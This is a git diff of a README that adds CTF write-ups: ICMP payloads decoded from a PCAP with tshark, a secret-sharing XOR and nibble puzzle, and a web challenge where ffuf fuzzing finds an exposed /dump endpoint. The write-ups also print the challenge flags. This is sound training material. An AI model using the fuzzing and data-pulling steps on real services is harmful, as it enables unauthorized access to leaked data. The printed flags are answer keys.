@@ -7,7 +7,7 @@
 
 - Repeated RSA
 
-- SSS
+- [SSS](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#SSS)
 
 - Neverending Randomness
 
@@ -17,7 +17,7 @@
 
 ### Forensics
 
-- Unknown-traffic1
+- [Unknown-traffic1](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#unknown-traffic1)
 
 - Unknown-traffic2
 
@@ -55,7 +55,7 @@
 
 - money
 
-- dot-private-key
+- [dot-private-key](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#dot-private-key)
 
 - [random-gallery](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#random-gallery)
 
@@ -80,6 +80,166 @@
 - [Ancient_house](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#ancient_house)
 
 ## --------------------------------------------------
+
+### unknown_traffic1
+
+- I opened the PCAP in Wireshark. Full of HTTP. What I did see: a huge number of ICMP echo requests (pings). That felt suspicious, so I clicked a few. The payloads weren’t the boring zeroes you normally see; they looked like neat little ASCII chunks. base64… maybe?
+
+- I tried Follow → ICMP Stream hoping it would magically show a message. Nope—just tiny fragments. I also poked Export Objects out of habit. Nothing.
+
+- Alright, command line time. I reached for tshark to pull the payloads out in order.
+
+```
+tshark -r unknown-traffic1.pcap -Y "icmp.type==8 && data.data"   -T fields -e icmp.seq -e data.data | sort -n -k1,1 | awk '{print $2}' | tr -d '
+' | xxd -r -p | base64 -d; echo
+```
+
+- ctf{72c8c1090e0bba717671f79de6e941a281e2f51da29865722f98c9fa3b7160e5}
+
+### sss
+
+- Three long hex strings: P1, P2, P3.
+
+- I tossed the shares into Python. First try crashed—one of the strings had an odd number of hex characters (classic paste gremlin). I just padded a trailing 0 when the length was odd and moved on. Then I pulled out the x (2nd byte) and the “body” (the rest), and combined the three bodies with XOR. That gave me a 256-byte blob called SSS_secret.bin.
+
+```
+Python used:
+P1 = "8010ba0d6e...f79bd12"
+P2 = "80264e325a...149a95a"
+P3 = "8036f43f34...e44142b"
+
+def fix(h):  # pad if odd count of hex nibbles
+    return h if len(h) % 2 == 0 else h + "0"
+
+def parse(h):
+    b = bytes.fromhex(fix(h))
+    assert b[0] == 0x80
+    return b[1], b[2:]  # x, y-bytes
+
+x1,y1 = parse(P1)
+x2,y2 = parse(P2)
+x3,y3 = parse(P3)
+
+secret = bytes(a ^ b ^ c for a,b,c in zip(y1,y2,y3))
+open("SSS_secret.bin","wb").write(secret)
+```
+
+Poking the blob
+Time for quick reconnaissance:
+
+- quick ID
+file SSS_secret.bin
+
+- peek as hex
+xxd -g 1 -l 256 SSS_secret.bin | sed -n '1,32p'
+
+- search for ASCII flag
+strings -a SSS_secret.bin | grep -iE 'ctf\{|flag\{'
+
+- search for UTF-16LE flag
+strings -el SSS_secret.bin | grep -iE 'ctf\{|flag\{'
+
+Nothing obvious. The hex dump had lots of zeros and pairs like 03 90, 06 50, 03 30—looked like each char might be split across two bytes (nibbles). I also tried a quick “reverse 16-bit” scan just in case:
+```
+python3 - << 'PY'
+import struct,re
+b=open("SSS_secret.bin","rb").read()
+w=list(struct.unpack("<{}H".format(len(b)//2), b))
+rb=struct.pack("<{}H".format(len(w)), *w[::-1])
+for s in (b.decode("utf-16le","ignore"),
+          rb.decode("utf-16le","ignore"),
+          b.decode("latin1","ignore")):
+    m=re.search(r'(ctf|flag)\{[^}]+\}', s, re.I)
+    if m: print(m.group(0))
+PY
+```
+- Still nothing obvious. I printed a base64 for a different angle—it looked like structured data near the end:
+```
+python3 - << 'PY'
+import base64
+print(base64.b64encode(open("SSS_secret.bin","rb").read()).decode())
+PY
+```
+- Those byte pairs really felt like nibbles. I split the blob into even/odd bytes, combined the low nibble of the even byte with the high nibble of the odd byte to rebuild characters, then reversed the result. That popped the flag instantly.
+
+- Python used:
+```
+b = open("SSS_secret.bin","rb").read()
+even, odd = b[::2], b[1::2]
+
+# high nibble from even's low 4 bits, low nibble from odd's high 4 bits
+ascii_bytes = bytes(((e & 0x0F) << 4) | (o >> 4) for e,o in zip(even, odd))
+
+# the text is reversed
+s = ascii_bytes[::-1].decode('ascii', 'ignore')
+
+import re
+print(re.search(r'(?:ctf|flag)\{[^}]+\}', s).group(0))
+```
+
+- ctf{d6b72529c6177d8f648ae85f624a24d6f1edce5ca29bd7cc0b888e117a123892}
+
+### dot-private-key
+
+- I opened DevTools → Network → I pasted a fake key and hit Check: POST /key with my secret in the payload.
+
+```
+HOST=http://ctf.ac.upt.ro:9198
+curl -i "$HOST/key"   -H 'Content-Type: application/json'   --data '{"key":"sk_live_TESTC","type":"api"}'
+```
+- At first I used "type":"API Key" and the server scolded me with Invalid type field. Lowercasing to "api" fixed it. Small stumble, quick fix.
+
+My next instinct was to go flag-hunting the lazy way:
+
+```
+curl -i $HOST/flag
+curl -i $HOST/flag.txt
+curl -i $HOST/robots.txt
+```
+
+- All 404s.
+
+- I grabbed the page and assets:
+
+```
+curl -s $HOST -o index.html
+grep -Eo '(src|href)="[^"]+"' index.html | sed 's/.*="//;s/"$//' | sort -u
+# script.js, styles.css
+
+curl -s $HOST/script.js -o script.js
+grep -nE 'fetch\(|/key|/lastUpdate' script.js
+```
+
+- The JS was tiny—POST /key and a GET /lastUpdate. That felt like a side door had to exist. Instead of unleashing a giant wordlist, I tried a surgical one:
+
+```
+cat > endpoints.txt <<'EOF'
+dump
+export
+export.csv
+keys
+logs
+db.json
+EOF
+```
+
+```
+ffuf -w endpoints.txt -u $HOST/FUZZ -mc 200,204,301,302,307,308,401,403
+# /dump → 200
+```
+
+- That was the moment. I pulled it:
+
+```
+curl -s $HOST/dump -o dump.json
+```
+
+The file was leaked:
+
+```
+grep -Eio 'ctf\{[^}]+\}' dump.json
+# ctf{284dc217ce36b9133c561207af3dbf6b8656323d6375f3f5c8c955be0a2aab66}
+```
 
 ### baofeng
 
